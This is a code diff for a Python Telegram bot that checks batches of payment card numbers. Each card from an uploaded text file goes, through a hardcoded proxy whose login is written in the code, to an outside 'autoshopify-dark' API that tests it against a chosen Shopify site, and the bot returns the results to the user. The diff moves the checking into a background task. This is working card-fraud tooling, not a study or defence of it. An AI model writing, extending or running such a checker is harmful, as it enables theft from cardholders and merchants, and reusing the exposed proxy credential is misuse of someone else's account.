@@ -4686,12 +4686,13 @@ import aiohttp
 import asyncio
 import os
 from telegram import Update, InputFile
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
-from db import get_user  # Your DB function
+from telegram.ext import ContextTypes
+from db import get_user
 
 PROXY = "198.23.239.134:6540:skgbsgwl:7y2hll5e4ycn"
 DOWNLOAD_FOLDER = "./downloads"
 os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
+
 
 # ---------------- Background card processing ---------------- #
 async def process_cards(update: Update, file_path: str, file_name: str, site: str):
@@ -4705,40 +4706,40 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
             await update.message.reply_text("⚠️ The file is empty.")
             return
 
-        sem = asyncio.Semaphore(5)  # Limit concurrent requests
+        sem = asyncio.Semaphore(5)  # limit concurrency
 
         async def check_card(card):
             async with sem:
                 api_url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}&proxy={PROXY}"
+                print("Checking:", api_url)
                 try:
                     async with session.get(api_url) as resp:
                         try:
-                            data = await resp.json()
+                            data = await resp.json(content_type=None)
                             response_text = data.get("Response", "No Response")
                         except Exception:
                             text = await resp.text()
-                            response_text = f"Invalid JSON: {text[:100]}"
+                            response_text = f"Invalid JSON: {text[:120]}"
                 except Exception as e:
                     response_text = f"Request Error: {e}"
 
-                return f"{card} => {response_text}"
+                # Append each card result immediately
+                async with asyncio.Lock():
+                    with open(output_file_path, "a", encoding="utf-8") as out:
+                        out.write(f"{card} => {response_text}\n")
 
-        # Run all cards concurrently and collect results
-        results = await asyncio.gather(*(check_card(card) for card in cards))
+        # Run all concurrently
+        await asyncio.gather(*(check_card(card) for card in cards))
 
-    # Write all results at once to prevent file corruption
-    with open(output_file_path, "w", encoding="utf-8") as out:
-        out.write("\n".join(results))
-
-    # Send the result file back to user
+    # Send final file when done
     if os.path.exists(output_file_path) and os.path.getsize(output_file_path) > 0:
         await update.message.reply_document(
             document=InputFile(output_file_path, filename=f"results_{file_name}")
         )
     else:
-        await update.message.reply_text("⚠️ Something went wrong, the result file is empty.")
+        await update.message.reply_text("⚠️ Something went wrong, results empty.")
 
-    # Cleanup temp files
+    # Cleanup
     try:
         os.remove(file_path)
         os.remove(output_file_path)
@@ -4746,6 +4747,7 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
         pass
 
 
+# ---------------- Unified handler ---------------- #
 async def mtxt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_data = await get_user(user_id)
@@ -4758,28 +4760,25 @@ async def mtxt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     site = user_data["custom_urls"]
 
-    # Check for file (direct or reply)
+    # Get document (direct or reply)
     document = update.message.document
     if not document and update.message.reply_to_message:
         document = update.message.reply_to_message.document
 
     if not document or not document.file_name.endswith(".txt"):
-        await update.message.reply_text(
-            "Please send or reply to a .txt file containing cards."
-        )
+        await update.message.reply_text("Please send or reply to a .txt file containing cards.")
         return
-
-    await update.message.reply_text("✅ Processing started. Please wait...")
 
     # Save file
     file_path = os.path.join(DOWNLOAD_FOLDER, f"{update.message.message_id}_{document.file_name}")
     file = await document.get_file()
     await file.download_to_drive(file_path)
 
-    # Await processing instead of creating a detached task
-    await process_cards(update, file_path, document.file_name, site)
+    # Tell user we started
+    await update.message.reply_text("✅ Processing started, please wait…")
 
-
+    # Run processor in background
+    asyncio.create_task(process_cards(update, file_path, document.file_name, site))
 
 
 
